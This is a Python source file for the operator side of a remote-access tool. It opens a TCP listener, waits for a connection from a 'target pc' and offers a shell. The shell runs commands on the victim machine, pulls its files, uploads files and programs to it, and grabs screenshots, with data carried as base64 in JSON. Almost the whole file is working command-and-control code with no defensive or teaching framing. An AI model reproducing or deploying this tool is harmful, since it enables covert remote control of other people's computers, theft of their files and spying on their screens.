#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#Native Imports
import socket #For TCP socket handeling
import json #For parsing and dumping json
import os #For interacting with the operating system

#Not native Imports
import subprocess #For interacting with cmd
import base64 #For decoding and encoding base64

#Custome Imports
import modules.simple_logging #For logging to a file

#Custome Exceptions
class ErrorCreatingSocket(Exception): #Raised when error ecured while creating socket
    def __init__(self):
        Exception.__init__(self,'ERROR CREATING SOCKET')

class FileOnlyModule(Exception):
    def __init__(self):
        Exception.__init__(self, 'FILE IS ONLY A MODULE')

help_shell = '''
    [Help:]
        [help : Show this message]
        [download : Download a file from the target pc [For example : 'download <path to file>']]
        [upload : Upload a file to the target pc [For example : 'upload <path to file>']]
        [cd : Change directory [For example : 'cd <path to directory>']]
        [get : Download something over http [For example : 'get <url to file>']]
        [start : Start a Programm on the tasget pc [For example : 'start <path to exe>']]
        [os : Execute command on your system without exiting shell [For example : 'os <command>]]
        [screengrab : Get a screenshot from the target pc]
        [KILL or exit : Kill the shell]
'''

class TCPShell:
    '''
    '''
    
    def __init__(self, HOST, PORT):
        
        print('[INFO] Initializing TCP server...')
        
        self.HOST = HOST
        self.PORT = PORT
        
        self.tcp_log = modules.simple_logging.logging(
            LogLevel='INFO',
            LogFile='tcp_server.log',
            Debug=False
        ) #Initializing tcp server log
        
    def json_send(self, data):
        
        json_dump = json.dumps(data.decode())
        
        json_dump = json_dump.encode()
        self.conn.send(json_dump)
    
    def json_recv(self):
    
        data = ''
        
        while True:
            
            try:
                
                data = data + self.conn.recv(1024).decode()
                data = json.loads(data)
                                
                return data.encode()
            
            except ValueError:
                
                continue

    def bind_shell(self):
        '''
        '''
        
        try:
            
            #Creating and binding socket
            self.s = socket.socket()
            self.s.bind((self.HOST, self.PORT)) #Bind HOST and PORT to socket
            self.s.listen(1) #Listening for one connection
            
            self.tcp_log.INFO('TCP Server serving on Port {}'.format(self.PORT))
            
            print('\n[INFO]SERVING ON PORT {}'.format(self.PORT))
            print('--------------------------------------')
                
            self.conn, self.addr = self.s.accept()
            
            self.tcp_log.INFO('Connection from {}'.format(self.addr))
            
            print('\n[INFO]CONNECTION FROM {}'.format(self.addr))
            print('--------------------------------------')
                
        except Exception as e:
            
            self.tcp_log.ERROR('Error while creating socket {}'.format(e))
            raise ErrorCreatingSocket
        
    def shell_loop(self):
        '''
        '''
        
        while True:
            
            try:
                
                command = input('{}/Shell>'.format(self.addr)) #Input for command
                
            except KeyboardInterrupt:
                
                print('\n[WARNING]KEYBOARDINTERRUPT KILLING SHELL')
                
                self.tcp_log.WARNING('KEYBOARDINTERRUPT KILLING CONNECTION')
                self.conn.send('KILL'.encode())
                self.conn.close()
                raise SystemExit
            
            if(command == None):
                
                self.json_send('clearstr'.encode())
                self.json_recv()
                
            elif(command[:4] == 'KILL' or command[:4] == 'exit'):
                
                print('\n[WARNING]KILLING SHELL')
                
                self.tcp_log.WARNING('KILL COMMAND SEND KILLING SHELL')
                self.json_send('KILL'.encode())
                self.conn.close()
                raise SystemExit
            
            elif(command[:4] == 'help'):
                
                print(help_shell)
                self.json_send('clearstr'.encode())
                self.json_recv()
                
            elif(command[:10] == 'screengrab'):
                
                self.json_send('screengrab'.encode())
                
                screenshot = base64.b64decode(self.json_recv())
                
                with open(os.path.join(os.getcwd(), 'screengrab.png'), 'wb') as f:
                    
                    f.write(screenshot)
                    
            elif(command[:2] == 'os'):
                
                proc = subprocess.Popen(command[3:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                try:
                    
                    result = proc.stdout.read().decode() + proc.stderr.read().decode()
                    print(result)
                    
                except:
                    
                    print('\nError Decoding stdout and stderr from subprocess output\n')
                self.json_send('clearstr'.encode())
                self.json_recv()
                
            elif(command[:8] == 'download'):
                
                self.json_send(command.encode())
                
                with open(command[9:], 'wb') as f:
                    
                    content = self.json_recv()
                    f.write(base64.b64decode(content))
                    
            elif(command[:6] == 'upload'):
                
                self.json_send(command.encode())
                
                try:
                
                    with open(command[7:], 'rb') as f:

                        content = f.read()
                        self.json_send(base64.b64encode(content))
                        
                except FileNotFoundError:
                    
                    print('[ERROR] File doesnt exist')
                    self.json_send('clearstr'.encode())
                    self.json_recv()
            
            else:
                
                self.json_send(command.encode()) #Send command
                print(self.json_recv().decode()) #Recv client feedback
                
if __name__ == "__main__":
    
    raise FileOnlyModule